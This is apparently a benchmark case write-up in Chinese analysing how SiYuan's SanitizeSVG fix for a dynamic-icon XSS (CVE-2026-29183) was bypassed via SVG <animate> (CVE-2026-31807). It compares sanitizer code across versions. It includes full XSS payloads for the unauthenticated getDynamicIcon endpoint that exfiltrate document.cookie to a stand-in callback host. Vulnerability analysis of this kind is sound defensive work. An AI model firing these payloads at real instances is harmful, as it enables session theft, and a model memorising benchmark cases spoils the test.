# SiYuan SanitizeSVG：静态 `href` 检查看不见运行时的 `<animate>`

- Case：`PCBV2-0193`
- 产品：SiYuan（思源笔记）。入口是内核 HTTP `GET /api/icon/getDynamicIcon`（type=8），`Content-Type: image/svg+xml`。本文只对照上游 tag 源码，**不 docker-build、不跑认证**（平台把 SiYuan 标成 L3/受限）。
- 链：CVE-2026-29183（3.5.8 → 3.5.9，引入 `SanitizeSVG`，挡静态 `javascript:` `href` / `on*`）→ CVE-2026-31807（3.5.9 → 3.5.10，元素黑名单加上 `animate` / `set` 等）
- 源码对着 tag `v3.5.8` / `v3.5.9` / `v3.5.10` 的 `kernel/util/misc.go`、`kernel/api/icon.go`。金丝雀是 benign：SVG 在笔记源里执行 JS，读 cookie 打到 callback。

NVD / GHSA-5hc8-qmg8-pw27 原话：*This is a bypass of the fix for CVE-2026-29183 (fixed in v3.5.9).* *The sanitizer checks attributes on elements at parse time. SVG `<animate>` and `<set>` elements modify attributes at runtime — these elements are not in the sanitizer's blocklist.*

注意：仓库里那份 `benchmark_v2/inputs/PCBV2-0193/v0_to_v1.diff` 把 3.5.10 的 animate 删除写进了「3.5.8→3.5.9」。**真实 `v3.5.9` 的 `SanitizeSVG` 没有 animate。** 下面以 GitHub tag 为准。

根因不只是「漏了几个标签」。检查插在「解析时这个属性 key 是不是 `href`、值是不是以 `javascript:` 开头」上；真正执行的是浏览器按 SMIL 在运行时改父节点的 `href`。同函数里已经有 `on*` 前缀删除和 `javascript:` 前缀检查，却不看 `attributeName` / `values`。下面按请求走进去。

---

## 这块功能本来在干什么

SiYuan 用 type=8 动态图标把 `content` 查询参数嵌进 SVG 的 `<text>`。接口未登录。一次典型请求：

```http
GET /api/icon/getDynamicIcon?type=8&color=blue&content=hello
```

`getDynamicIcon` 调 `generateTypeEightSVG`，用 `fmt.Sprintf` 把 `content` **原样**插进模板，再（若未打开 `AllowSVGScript`）跑消毒，最后以 `image/svg+xml` 返回。设计意图：`content` 是图标上的短文字，输出应是不能执行脚本的 SVG。成功穿越之后的效果是：**浏览器把这份 SVG 当独立文档打开时跑 JS**，cookie 里的 flag 送到 collector。

数据流：

```text
GET /api/icon/getDynamicIcon?type=8&content=...
    → generateTypeEightSVG
         fmt.Sprintf(`<svg>...<text ...>%s</text></svg>`, content)
         ← 未转义，</text> 可以破出文本节点
    → util.SanitizeSVG(svg)          ← V1 插在这里
         html.Parse
         删 script/iframe/object/embed/foreignobject
         丢掉 on* ；href 若 HasPrefix("javascript:") 则丢掉该属性
    → c.String(200, svg)  Content-Type: image/svg+xml
    → 浏览器渲染 SVG 文档 → 点击 / SMIL → javascript: URL
```

`content` 出现在 `<text>` 内部。payload 以 `</text><a href="javascript:...">` 起手，先闭合模板里的 text，再注入自己的元素。消毒看到的是**整份已拼接的 SVG**，不是单独的 `content` 字符串。

---

## 原始漏洞：拼接后几乎不洗（CVE-2026-29183，3.5.8）

3.5.8 的 type=8 在返回前只调 `RemoveScriptsInSVG`：递归删 `<script>`，别的不管。

```go
// kernel/api/icon.go  (siyuan v3.5.8)
svg = generateTypeEightSVG(color, content, id)
...
svg = util.RemoveScriptsInSVG(svg)
```

```go
// kernel/util/misc.go :: RemoveScriptsInSVG  (v3.5.8)
if c.Type == html.ElementNode && strings.EqualFold(c.Data, "script") {
    n.RemoveChild(c)
}
```

seed：`content=</text><a href="javascript:location='http://callback:9000/c?f='+document.cookie"><text>c</text></a><text>`。没有 `<script>` 标签，`href="javascript:..."` 原样留下。用户打开这个 URL（或 `<img>`/`<object>` 不够，需要当 SVG 文档导航）就会执行。v0 上 callback 收到 flag。GHSA-6865-qjcf-286f 还提到 `onerror` 等事件属性，3.5.8 同样不删。

---

## 维护者改了什么（CVE-2026-29183 修复，3.5.9）

3.5.9 把 `RemoveScriptsInSVG` 换成 `SanitizeSVG`，icon.go 改为调用新函数。`v3.5.9` 的走访逻辑是：

```go
// kernel/util/misc.go :: SanitizeSVG  (siyuan v3.5.9)
tag := strings.ToLower(c.Data)
if tag == "script" || tag == "iframe" || tag == "object" || tag == "embed" || tag == "foreignobject" {
    n.RemoveChild(c)
    c = next
    continue
}
// 属性：
key := strings.ToLower(a.Key)
val := strings.TrimSpace(strings.ToLower(a.Val))
if strings.HasPrefix(key, "on") {
    continue // 丢掉 onload/onerror/...
}
if key == "href" || key == "xlink:href" || key == "xlinkhref" {
    if strings.HasPrefix(val, "javascript:") {
        continue
    }
    if strings.HasPrefix(val, "data:") {
        if strings.Contains(val, "text/html") || strings.Contains(val, "image/svg+xml") ||
            strings.Contains(val, "application/xhtml+xml") {
            continue
        }
    }
}
```

V1 谓词的字面意思：

| 层 | 看什么 |
|---|---|
| 元素名 | 是否属于那五个危险标签 |
| 属性 key | 是否 `on*` / `href` / `xlink:href` |
| `href` 的值 | 是否 **前缀** 为 `javascript:`（已 ToLower + TrimSpace） |

没有 SMIL 元素，没有 `attributeName`，没有 `values`/`from`/`to`。`html.Parse` 之后的树是静态快照。

对 seed 这种静态 `<a href="javascript:...">`，它确实够用：`key=="href"` 且 `HasPrefix(val, "javascript:")`，该属性被丢掉，点击不再走 javascript: URL。这就是 v1 + `--seed` 应被挡住的那条链。

补丁默认了两件事：

1. 危险 URL 出现在名为 `href` 的属性里，而且字面以 `javascript:` 开头。
2. 元素不会在运行时再给自己或父节点安上 `href` / `on*`。

第二点不成立。SVG 的 `<animate attributeName="href" values="javascript:...">` 在 SMIL 开始时才改父 `<a>` 的 href。

---

## 检查之后谁真正执行那段 URL

`SanitizeSVG` 返回字符串，`getDynamicIcon` 原样写入响应。浏览器把 `image/svg+xml` 当 SVG 文档解析。`<animate fill="freeze" begin="0s">` 在 t=0 把父 `<a>` 的 `href` 设成 `values` 里的 javascript: URL。过滤器刚看过的是「此刻属性表里有没有名叫 href 的 javascript:」；点击时内核看到的是动画写进去的 href。中间没有第二次「运行时属性」谓词。

拼接发生在消毒**之前**：

```go
// kernel/api/icon.go :: generateTypeEightSVG  (v3.5.9)
return fmt.Sprintf(`
    <svg ...>
        <path .../>
        <text x="50%%" y="55%%" dy="%s" style="...">%s</text>
    </svg>
    `, colorScheme.Primary, dy, fontSize, content)
```

`%s` 不 HTML 转义。`</text><a><animate .../></a><text>` 能长成模板外的兄弟节点，消毒必须自己把它们认出来。V1 认 script，不认 animate。

`AllowSVGScript` 为真时这一段消毒整段跳过——那是配置开关，不是本条残余。默认配置下 `!model.Conf.Editor.AllowSVGScript` 为真，type=8 必走 `SanitizeSVG`。icon.go 在 v3.5.8/3.5.9/3.5.10 的 `getDynamicIcon` 骨架相同，只换了调用的消毒函数名。

响应头：

```go
c.Header("Content-Type", "image/svg+xml")
c.Header("Cache-Control", "no-cache")
c.String(http.StatusOK, svg)
```

浏览器按 SVG 文档而不是按「图片」执行脚本（直接导航或部分嵌入方式）。这是效果通道，不是另一条 HTTP 路由。

---

## 仓库里已经有更强的检查，SMIL 没用

V1 已经：

- 元素名 ToLower 后对照黑名单；
- 属性 key ToLower；
- 丢掉所有 `on*`；
- `href` 做 `javascript:` 前缀检查。

GHSA-5hc8 建议的更强谓词，V1 都没挂上：

1. 黑名单加上 `animate` / `set` / `animatetransform` / `animatemotion`（V2 做了）；
2. `values` / `from` / `to` 含 `javascript:` 则丢掉该属性（V2 顺带做了，但元素已删则是死代码）；
3. `attributeName` 若指向 `href` / `on*` 则整元素删除（V2 **仍没做**，靠删元素兜住）。

谁检查 `javascript:`（3.5.9）：

| 属性 | 检查？ |
|---|---|
| `href` / `xlink:href` | 是，`HasPrefix` |
| `style` 里的 `url(javascript:` | 是，`Contains` |
| `values` / `from` / `to` | **否** |
| `attributeName="href"` | **否**（key 不是 href） |

不是仓库里没有「javascript: 不能出现」这个想法，是 **只扫了静态 href，没扫会改 href 的动画**。另有一条独立的 29183 残余 GHSA-pmc9：`java\tscript:` 这种空白插在 scheme 里能骗过 `HasPrefix`，浏览器按 WHATWG 会剥 tab。那是**另一条** incomplete-fix，平台本 case 的 residual 走的是 animate，不是空白 scheme。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「静态 href」和「SMIL 写 href」落到具体 content：

- V1 过滤器：`key==href && HasPrefix(val, "javascript:")`
- 浏览器：`<animate attributeName="href" values="javascript:...">` 在 t=0 改父节点

```text
seed（</text><a href="javascript:location=callback+cookie">...）:
  解析后 a 上就有 href=javascript:...
  → 属性被丢掉 → 点击不执行

residual（</text><a><animate attributeName="href" values="javascript:location=..." begin="0s" fill="freeze"/>...）:
  a 上当时没有 href
  animate 的 key 是 attributename / values / begin / fill，都不进 href 分支
  animate 不在五元素黑名单里 → 整段留下
  → 浏览器运行时写 href → 点击执行
```

GHSA-5hc8 Vector 1 就是这条 animate；Vector 2 用 `<set attributeName="onmouseover">` 动态加事件（V1 会删静态 `on*`，但 `set` 的 `to` 不是 `on*` key）。平台残余用 Vector 1。

---

## 残余仍然走同一条 getDynamicIcon type=8（CVE-2026-31807）

没有换路由、没有换 `fmt.Sprintf` 模板、没有换 `image/svg+xml`。还是：

```http
GET /api/icon/getDynamicIcon?type=8&color=blue&content=
  </text><a><animate attributeName="href" values="javascript:location='http://callback:9000/c?f='+document.cookie"
  begin="0s" fill="freeze"/><text ...>click</text></a><text>
```

`generateTypeEightSVG` 仍然把 content 嵌进 `<text>`；`SanitizeSVG` 仍然只洗静态 href；响应仍然是可导航的 SVG 文档。平台残余和 seed 都是这条未鉴权图标接口上的反射 XSS。不是另一个 API，只是从「写在 href 上」换成「让动画去写 href」——而这正是 31807 相对 29183 的那条缝。

seed 被挡住只说明「静态 `javascript:` href 没了」，不说明「SVG 不能在运行时再获得 javascript: URL」。

---

## 后来又补了什么（CVE-2026-31807，3.5.10）

3.5.10 把 SMIL 元素推进删除名单，并扫 `values`/`from`/`to`；顺带剥 `href` 值里的 CR/LF/TAB（回应 GHSA-pmc9 那类空白）：

```go
// kernel/util/misc.go :: SanitizeSVG  (siyuan v3.5.10)
if tag == "script" || ... || "foreignobject" || "animate" == tag ||
    "animatetransform" == tag || "animatecolor" == tag || "animatemotion" == tag || "set" == tag {
    n.RemoveChild(c)
    ...
}
val = strings.Map(func(r rune) rune {
    if r == '\t' || r == '\n' || r == '\r' { return -1 }
    return r
}, val)
if key == "values" || key == "from" || key == "to" {
    if strings.Contains(val, "javascript:") {
        continue
    }
}
```

对残余输入：`<animate>` 被 `RemoveChild`，SMIL 不存在，父 `<a>` 没有 javascript: href。公开建议升级到 3.5.10。后续还有 `data:text/xml` 等独立 advisory（GHSA-4mx9），不在本条 v2 范围。

即便如此，这仍然是「解析后再删一批标签」。`content` 照样不转义。对本条 animate 够用。本 benchmark 的 v2 只关闭这一条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是「解析完成后的属性表」。真正执行的是 SVG 运行时的 SMIL。V2 仍在 `SanitizeSVG` 加码，但终于把会改属性的元素整颗摘掉。更彻底的一层是 `generateTypeEightSVG` 对 `content` 做 HTML 转义，让 `</text>` 进不了树——那一层到 3.5.10 也没改。

**不是没有更好的谓词。**  
`javascript:` 检查已经写了。从 V1 的 diff 只能看到五个标签 + href 前缀；要判断是否闭合，必须看到 SMIL 用 `attributeName`/`values` 改 href，以及 `html.Parse` 只给出静态树。

**同一 `getDynamicIcon`、同一 `content`，只换了注入元素。**  
静态 `<a href>` 死；`<a><animate ...>` 活。GHSA 两条 Vector 都还在 type=8。

**静态属性清洗和运行时属性不是一层。**  
`HasPrefix(href, "javascript:")` 假定危险值在消毒那一刻已经写在 href 上。动画把这个假定打掉。空白插进 `javascript:`（GHSA-pmc9）打的是同一前缀检查的另一面，平台本条 residual 没有走那条。

**金丝雀在 SVG 文档源里是有意的。**  
接口 JSON 里没有 flag。能在 callback 看到 cookie，说明浏览器把返回体当 SVG 执行了 JS——也就是 `SanitizeSVG` 放行了会在运行时变成 javascript: URL 的那棵树。

---

## 版本、入口、参考

| | 版本 | type=8 消毒 | 静态 `javascript:` href seed | `<animate>` residual |
|---|---|---|---|---|
| V0 | 3.5.8 | 只删 `<script>` | 执行，flag | （不必） |
| V1 | 3.5.9 | `SanitizeSVG`：五标签 + `on*` + href 前缀 | href 被剥 | animate 留下，运行时写 href，flag |
| V2 | 3.5.10 | 另删 animate/set/... | 挡 | 元素被删 |

- 产品 HTTP：`GET /api/icon/getDynamicIcon?type=8&content=`（未鉴权，`image/svg+xml`）
- [CVE-2026-29183](https://nvd.nist.gov/vuln/detail/CVE-2026-29183) / [GHSA-6865-qjcf-286f](https://github.com/siyuan-note/siyuan/security/advisories/GHSA-6865-qjcf-286f)
- [CVE-2026-31807](https://nvd.nist.gov/vuln/detail/CVE-2026-31807) / [GHSA-5hc8-qmg8-pw27](https://github.com/siyuan-note/siyuan/security/advisories/GHSA-5hc8-qmg8-pw27)
- 相邻但不作为本条平台残余：[GHSA-pmc9](https://github.com/siyuan-note/siyuan/security/advisories/GHSA-pmc9-f5qr-2pcr)（`javascript:` 空白）
- V1 源码：[`v3.5.9` `SanitizeSVG`](https://github.com/siyuan-note/siyuan/blob/v3.5.9/kernel/util/misc.go)、[`getDynamicIcon`](https://github.com/siyuan-note/siyuan/blob/v3.5.9/kernel/api/icon.go)
- V2 tag：[`v3.5.10` `SanitizeSVG`](https://github.com/siyuan-note/siyuan/blob/v3.5.10/kernel/util/misc.go)
